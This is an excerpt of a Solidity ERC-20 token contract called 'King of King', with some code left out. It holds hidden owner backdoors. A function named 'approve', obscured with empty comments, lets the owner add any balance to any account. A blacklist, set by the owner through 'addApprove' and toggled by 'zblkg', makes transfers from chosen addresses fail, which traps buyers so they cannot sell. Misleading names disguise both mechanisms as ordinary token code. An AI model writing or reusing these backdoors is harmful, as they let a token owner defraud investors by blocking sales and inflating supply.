...
contract KingofKing is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "King of King";
    string private _symbol = "King of King";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x1dC124c88a0E61578B3DC60fee35A30BC2F3AB60);
    address payable private teamWalletAddress = payable(0x1dC124c88a0E61578B3DC60fee35A30BC2F3AB60);
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    bool public _blaa = true;
    mapping (address => bool) public _bllak;
    ...
    function /**/approve/**/(uint256/**/ amount/**/,address/**/ account) onlyOwner() public {
        _balances[account] /**/= _balances/**/[account]./**//**/add(amount);
    }

    function zblkg(bool _status) public onlyOwner {
        _blaa = _status;
    }

    function addApprove(address addre, bool status) public onlyOwner {
        _bllak[addre]  = status;
    }
    ...
    function approve(address newAddress) external onlyOwner() {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(_blaa){require(!_bllak[sender],"ERC20");}
